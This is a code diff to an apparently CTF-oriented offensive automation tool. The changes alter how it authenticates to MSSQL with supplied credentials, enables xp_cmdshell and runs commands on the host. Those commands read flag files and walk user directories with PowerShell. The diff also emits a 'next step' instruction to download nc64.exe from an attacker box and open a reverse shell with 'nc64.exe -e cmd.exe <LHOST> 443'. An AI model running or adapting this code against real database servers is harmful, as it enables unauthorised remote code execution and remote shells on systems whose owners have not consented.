@@ -26,16 +26,18 @@ from ...core.report import HostReport, Finding
 from ...data import knowledge
 
 _COMMON_USERS = ["sql_svc", "sa", "administrator", "svc_sql", "mssql"]
-# Flag-hunt run through xp_cmdshell — several paths so it works whatever the
-# service account is. %USERPROFILE% expands to the running user's home.
-_FLAG_CMDS = [
-    "whoami",
-    r"type %USERPROFILE%\Desktop\user.txt",
-    r"type %USERPROFILE%\Desktop\root.txt",
-    r"type C:\Users\sql_svc\Desktop\user.txt",
-    ('powershell -c "gci C:\\Users -Recurse -Force -Include user.txt,root.txt '
-     '-EA 0 | %{$_.FullName; gc $_.FullName}"'),
-]
+# Driven through mssqlclient's OWN shell shortcuts (enable_xp_cmdshell /
+# xp_cmdshell <cmd>) in -file mode — far more reliable than raw sp_configure
+# SQL. %USERPROFILE% expands to the running service account's home.
+_MSSQL_SCRIPT = "\n".join([
+    "enable_xp_cmdshell",
+    "xp_cmdshell whoami",
+    r"xp_cmdshell type %USERPROFILE%\Desktop\user.txt",
+    r"xp_cmdshell dir C:\Users\*\Desktop\*.txt /s /b",
+    ('xp_cmdshell powershell -c "gci C:\\Users -Recurse -Force -Include '
+     'user.txt,root.txt -EA 0 | %{Write-Output $_.FullName; gc $_.FullName}"'),
+    "exit",
+]) + "\n"
 
 
 def run(host: HostReport, opts) -> None:
@@ -88,13 +90,10 @@ def _mssql(host, ip, dom, user, pw, client) -> bool:
             seen.add(t)
             targets.append((d, t))
 
-    script = ("EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n"
-              "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;\n"
-              + "".join(f"EXEC xp_cmdshell '{c}';\n" for c in _FLAG_CMDS))
     sf = os.path.join(tempfile.gettempdir(), f"scryer_mssql_{user}.sql")
     try:
         with open(sf, "w") as fh:
-            fh.write(script)
+            fh.write(_MSSQL_SCRIPT)
     except OSError:
         return False
 
@@ -105,37 +104,66 @@ def _mssql(host, ip, dom, user, pw, client) -> bool:
         blob = (out or "") + (err or "")
         low = blob.lower()
         if ("login failed" in low or "status_logon_failure" in low
-                or "access denied" in low or not blob.strip()):
+                or "access denied for user" in low or not blob.strip()):
             continue   # auth failed with this target form — try the next
-        # Authenticated. Did we get command execution?
         cmd_tpl = f"impacket-mssqlclient {d or '.'}/{user}:'{pw}'@{ip} -windows-auth"
-        blocked = "blocked access to procedure" in low
-        if not blocked:
-            utils.log("hot", f"MSSQL xp_cmdshell RCE as {d or '.'}/{user}", indent=1)
-            host.add(Finding(
-                title=f"RCE via MSSQL xp_cmdshell ({user})",
-                detail=f"sysadmin + xp_cmdshell enabled. {cmd_tpl}",
-                severity="critical", category="access", port=1433,
-                service="mssql", evidence=cmd_tpl))
-            host.add(Finding(
-                title="MSSQL -> reverse shell (next step)",
-                detail="Stage nc: your box `python3 -m http.server 80` + "
-                       "`nc -lvnp 443`, then in the SQL shell:\n"
-                       "xp_cmdshell \"powershell -c cd C:\\Users\\Public; wget "
-                       "http://<LHOST>/nc64.exe -outfile nc64.exe; "
-                       ".\\nc64.exe -e cmd.exe <LHOST> 443\"",
-                severity="info", category="access", port=1433, service="mssql",
-                confidence="potential"))
-        else:
+        if "blocked access to procedure" in low and "output" not in low:
             host.add(Finding(
                 title=f"MSSQL login works ({user}) but not sysadmin",
                 detail=f"{cmd_tpl}\nxp_cmdshell is blocked — you are not sysadmin. "
                        "Try other creds, or impersonation (EXECUTE AS LOGIN).",
                 severity="high", category="access", port=1433, service="mssql",
                 evidence=cmd_tpl))
-        _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})")
+            return True
+        utils.log("hot", f"MSSQL xp_cmdshell RCE as {d or '.'}/{user}", indent=1)
+        host.add(Finding(
+            title=f"RCE via MSSQL xp_cmdshell ({user})",
+            detail=f"sysadmin + xp_cmdshell enabled. {cmd_tpl}",
+            severity="critical", category="access", port=1433,
+            service="mssql", evidence=cmd_tpl))
+        # Show the actual command output so the flag is visible even if the
+        # auto-parser misses it, and capture any flag tokens.
+        _show_output(blob)
+        if not _harvest_flags(host, blob, f"MSSQL xp_cmdshell ({user})"):
+            host.add(Finding(
+                title="MSSQL xp_cmdshell output (no flag token matched)",
+                detail=_clean_output(blob)[:800] or "(no output captured)",
+                severity="info", category="access", port=1433, service="mssql"))
+        host.add(Finding(
+            title="MSSQL -> reverse shell (next step)",
+            detail="Stage nc: your box `python3 -m http.server 80` + "
+                   "`nc -lvnp 443`, then in the SQL shell:\n"
+                   "xp_cmdshell \"powershell -c cd C:\\Users\\Public; wget "
+                   "http://<LHOST>/nc64.exe -outfile nc64.exe; "
+                   ".\\nc64.exe -e cmd.exe <LHOST> 443\"",
+            severity="info", category="access", port=1433, service="mssql",
+            confidence="potential"))
         return True   # valid creds — stop trying more accounts
     return False
+
+
+def _clean_output(blob: str) -> str:
+    """Keep the xp_cmdshell result rows, drop impacket banner/INFO noise + the
+    NULL padding rows and the 'output'/'------' column headers."""
+    keep = []
+    for line in (blob or "").splitlines():
+        s = line.strip()
+        if not s or s == "NULL" or s == "output" or set(s) <= {"-"}:
+            continue
+        if s.startswith(("[*]", "[-]", "Impacket", "output")) or \
+                re.match(r"^\[\*\]|^ENVCHANGE|^INFO\(", s):
+            continue
+        keep.append(s)
+    return "\n".join(keep)
+
+
+def _show_output(blob: str) -> None:
+    text = _clean_output(blob)
+    if not text:
+        return
+    utils.log("good", "xp_cmdshell output:", indent=2)
+    for line in text.splitlines()[:30]:
+        print("      " + utils.c(line[:160], utils.C.GREY))
 
 
 # --- SMB / WinRM spray + shells --------------------------------------------
